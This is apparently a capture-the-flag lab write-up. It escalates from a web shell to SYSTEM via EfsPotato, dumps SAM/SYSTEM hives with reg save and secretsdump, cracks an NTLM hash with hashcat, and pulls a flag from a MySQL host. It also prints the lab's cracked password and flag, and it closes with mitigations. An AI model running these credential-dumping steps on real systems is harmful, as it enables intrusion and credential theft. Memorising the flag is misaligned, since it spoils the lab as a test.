Pre-req knowledge

  • Windows web shells and reverse shells (Go used here for reliability)
  • SeImpersonatePrivilege and potato-family tools (EfsPotato)
  • Offline SAM/NTDS-style NTLM cracking (hashcat/john)
  • PHP mysqli from a compromised web host to a second SQL host

Core concept (one line)

Own the web worker, potato to SYSTEM, crack the next human account, then query the SQL box that holds the real flag.

Introduction

Staged is a two-host lab: compromise the Windows web tier as j.smith, escalate with EfsPotato, dump and crack NTLM for p.richardson, then from the web host open MySQL on sqlsrv.hacksmarter and read hacksmarter_db.final_config.admin_api_token.

Root cause

Web execution identity holds SeImpersonate; local secrets dump yields crackable NTLM; SQL trusts the web tier’s identity/network path enough to expose the final secret. Staging forces you to treat “SYSTEM on box A” as intermediate, not the end. 

webshell as j.smith (SeImpersonate)
  → Go reverse shell + EfsPotato → SYSTEM
  → reg save SAM/SYSTEM → secretsdump
  → crack p.richardson NTLM → ^^CThacker66
  → from web: PHP mysqli → 10.1.118.5
  → hacksmarter_db.final_config → admin_api_token

Step 1: Web foothold as j.smith

Why we do this: Lab provides (or leads to) code execution in a user context with impersonation rights — confirm privileges immediately.
# obtain / deploy webshell on web.hacksmarter (10.1.107.112)
# upgrade to Go reverse shell for stability
whoami /all
# expect SeImpersonatePrivilege enabled for j.smith or the worker identity

Step 2: EfsPotato → SYSTEM

Why we do this: SeImpersonate on modern Windows still maps cleanly to potato-class SYSTEM for many service identities.
# run EfsPotato (or peer) from the reverse shell
# confirm: whoami → nt authority\system

Step 3: Dump local secrets

Why we do this: Offline hives give every local NTLM without further noisy remote brute force.
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# exfil to Kali
secretsdump.py -sam sam.save -system system.save LOCAL

Step 4: Crack p.richardson

Why we do this: Cleartext password is needed for interactive/DB paths that reject raw NTLM in this layout.
hashcat -m 1000 pr.hash /usr/share/wordlists/rockyou.txt
# or john --format=NT
# result: p.richardson → ^^CThacker66

Step 5: MySQL from the web host → final flag

Why we do this: Flag is not on the web desktop — it is staged on SQL as an API token row.
# from web host (PHP mysqli or mysql client) as p.richardson / app creds path
# host: 10.1.118.5 (sqlsrv.hacksmarter)
# database: hacksmarter_db
# table: final_config → column admin_api_token
FLAG{b64f49553d5c441652e95697a2c5949e}

Security impact

  • Web RCE → full host SYSTEM
  • Credential reuse into a second tier (SQL)
  • Business secret (API token / flag) readable after one cracked human password

Mitigation

  • Remove SeImpersonate from web workers; run sites under locked-down gMSA / low-priv pools.
  • Block potato-class RPC/pipe abuse where feasible; EDR on reg save of SAM/SYSTEM.
  • Strong unique passwords; monitor NTLM crack attempts offline is free for attackers — assume dumps will be cracked.
  • SQL: network segmentation, least privilege DB users, no “final secrets” readable from web identity.
  • Detect outbound MySQL from IIS worker processes if that is not a normal app pattern.

Beyond Root

First principles drill

  • Trust boundary: web code execution ≠ end of engagement when secrets live on tier 2.
  • Transform: SeImpersonate → SYSTEM token → hive files → NTLM → password → SQL row.
  • Canary: webshell → potato → reg save → rare PHP mysqli to a different host.

Document the engagement

  • Ops: ~/htb/staged/ATTACK_LOG.md, loot/FLAG.txt, hives, cracked.out
  • Public: this page

Conclusion

Staged teaches multi-host thinking: potato and dump are mid-game. The name is the lesson — the real prize was staged one hop further on SQL.
